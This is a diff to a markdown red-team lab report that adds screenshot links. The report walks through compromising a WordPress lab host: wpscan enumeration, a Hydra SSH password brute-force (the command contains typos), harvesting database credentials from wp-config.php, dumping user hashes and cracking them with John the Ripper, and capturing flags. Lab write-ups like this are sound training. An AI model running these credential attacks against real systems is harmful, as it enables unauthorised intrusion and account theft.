@@ -9,6 +9,8 @@
 
 Nmap scan results for each machine reveal the below services and OS details:
 
+![OffensiveReport_nmap_scan_1.png](Images/OffensiveReport_nmap_scan_1.png "nmap Scan")
+
 This scan identifies the services below as potential points of entry:
 - Target 1
   - SSH (port 22)
@@ -30,11 +32,19 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   - `flag1.txt`: {b9bbcb33e11b80be759c4e844862482d
     - **Exploit Used**
       - - WPScan to enumerate users on the Target1 Wordpress website. - $ wpscan --url 192.168.1.110/wordpress - $ wpscan --url 192.168.1.110 --enumerate -u
+
+![OffensiveReport_flag1_totalimage_2.png](Images/OffensiveReport_flag1_totalimage_2.png "flag1 Image 1")
+
+![OffensiveReport_flag1_totalimage_3.png](Images/OffensiveReport_flag1_totalimage_3.png "flag1 Image 2")
   
   - It was known the user's password was weak and obvious. It was guessed before any commands were used but for practice, we used Hydra to crack Michael's password.
   - Command: hydra -l michael -p /usr/sahre/wordlists/rockyou.txt -vV 192.16.1.110 -t 4 ssh
 
+![OffensiveReport_flag1_totalimage_4.png](Images/OffensiveReport_flag1_totalimage_4.png "flag1 Image 3")
+
   - flag1 was found in /var/www/html folder after searching through each file in the directory. The flag1 was found in the service.html in an HTML comment near the bottom of the HTML file.
+
+![OffensiveReport_flag1_totalimage_5.png](Images/OffensiveReport_flag1_totalimage_5.png "flag1 Image 4")
 
   - `flag2.txt`: {fc3fd58dcdad9ab23faca6e9a36e581c}
     - **Exploit Used**
@@ -47,11 +57,19 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
           - ls -l
           - cat flag2.txt
 
+![OffensiveReport_flag2_totalimage_6.png](Images/OffensiveReport_flag2_totalimage_6.png "flag2 Image 1")
+
   - `flag3.txt`: {afc01ab56b50591e7dccf93122770cd2}
     - **Exploit Used**
       - Same exploits as flag1 and flag2.
       - Once in Michael's system, we captured flag3.txt by accessing the MYSQL database
       - After searching through wp-config.php, we had access to his MYSQL database login credentials and were able to further explore the database.
+
+![OffensiveReport_flag3_totalimage_7.png](Images/OffensiveReport_flag3_totalimage_7.png "flag3 Image 1")
+
+![OffensiveReport_flag3_totalimage_8.png](Images/OffensiveReport_flag3_totalimage_8.png "flag3 Image 2")
+
+![OffensiveReport_flag3_totalimage_9.png](Images/OffensiveReport_flag3_totalimage_9.png "flag3 Image 3")
 
       - Commands:
         - mysql -u root -p
@@ -74,9 +92,13 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       - show tables;
       - select * from wp_users;
 
+![OffensiveReport_flag4_totalimage_10.png](Images/OffensiveReport_flag4_totalimage_10.png "flag4 Image 1")
+
     - The wp_hashes.txt file containing Steven's password hashes was cracked using John the Ripper. 
     - Command:
       - john wp_hashes.txt
+      
+![OffensiveReport_flag4_totalimage_11.png](Images/OffensiveReport_flag4_totalimage_11.png "flag4 Image 2")
 
     - After getting Stevens password, we could now SSH into the server as Steven.
        - Commands: 
@@ -88,4 +110,4 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
        - ls
        - cat flag4.txt
 
-
+![OffensiveReport_flag4_totalimage_12.png](Images/OffensiveReport_flag4_totalimage_12.png "flag4 Image 3")
